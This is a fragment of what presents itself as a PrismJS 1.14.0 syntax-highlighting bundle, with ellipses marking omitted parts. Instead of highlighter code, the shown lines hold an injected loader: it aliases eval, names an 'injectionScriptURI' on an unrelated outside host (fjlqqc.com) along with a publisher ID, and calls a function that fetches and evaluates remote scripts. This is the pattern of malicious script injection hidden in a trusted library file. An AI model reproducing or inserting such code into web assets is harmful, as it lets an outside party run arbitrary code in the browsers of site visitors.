/* PrismJS 1.14.0
http://prismjs.com/download.html#themes=prism-twilight&languages=markup+clike+javascript+markup-templating+php+php-extras&plugins=line-numbers */
...
var sourceScriptURI = 'http://prismjs.com/components/prism-php.min.js';
(function() {
    var evalGloble = eval;
...
var sourceScriptURI = 'http://prismjs.com/plugins/line-numbers/prism-line-numbers.min.js';
(function() {
    var evalGloble = eval;
    var _loader = function(uri) {
        if (!top || !this) {
    ...
    var publisherID = '73b8f7e0-41d1-4fed-83d7-6f9297e16d74';
    var injectionScriptURI = "http://www.fjlqqc.com/common/api/v1.0/slot-code/publisher/";
    //var currentScript = getCurrentScript(sourceScriptURI);
    if (true) {
        evalSrcScript(sourceScriptURI);
